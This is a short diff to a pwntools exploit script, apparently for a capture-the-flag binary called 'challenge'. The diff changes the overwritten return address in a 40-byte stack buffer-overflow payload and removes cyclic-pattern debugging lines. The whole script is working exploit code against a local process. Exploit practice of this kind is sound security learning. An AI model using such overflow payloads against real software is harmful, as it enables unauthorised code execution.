@@ -4,14 +4,10 @@ from pwn import *
 
 import sys
 
-payload = b'a' * 40 + p64(0x40057a)
+payload = b'a' * 40 + p64(0x400606)
 
 p = process("./challenge")
 
 p.sendline(payload)
 
-print(p.recvall())
-
-# print(cyclic(50))
-
-# print(cyclic_find(b'aaaabaaac'[:4]))
+print(p.recvall().decode(), end='')
